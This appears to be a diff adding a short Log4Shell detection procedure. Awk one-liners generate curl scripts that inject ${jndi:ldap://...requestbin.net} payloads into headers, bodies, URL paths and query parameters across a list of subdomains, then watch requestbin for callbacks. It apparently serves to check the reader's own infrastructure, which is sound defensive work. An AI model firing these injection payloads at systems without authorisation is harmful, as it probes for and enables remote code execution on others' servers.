@@ -1,0 +1,19 @@
+1. Got to requestbin.net & you will get a new subdomain such as: 4d2ea.d.requestbin.net & keep the page live (do not close the tab)
+2. Get all the subdomains either from route53 or another location & create subdomains.txt 
+3. Run the below awk scripts against the subdomains.txt 
+
+#Headers
+awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v "$1 " -H '\''User-Agent: ${jndi:ldap://"b[1]".4d2ea.d.requestbin.net}'\'' --connect-timeout 2.3"}' subdomains.txt > run-headers.sh
+
+#Body text
+awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v "$1 " --data '\''${jndi:ldap://"b[1]".4d2ea.d.requestbin.net}'\'' --connect-timeout 2.3"}' subdomains.txt > run-body.sh
+
+#Url 
+awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v "$1"/${jndi:ldap://"b[1]".4d2ea.d.requestbin.net} --connect-timeout 2.3"}' subdomains.txt > run-urls.sh
+
+
+#Query-params
+awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v "$1"?l=${jndi:ldap://"b[1]".4d2ea.d.requestbin.net} --connect-timeout 2.3"}' subdomains.txt > run-query-param.sh
+
+
+Monitor the page in step 1 
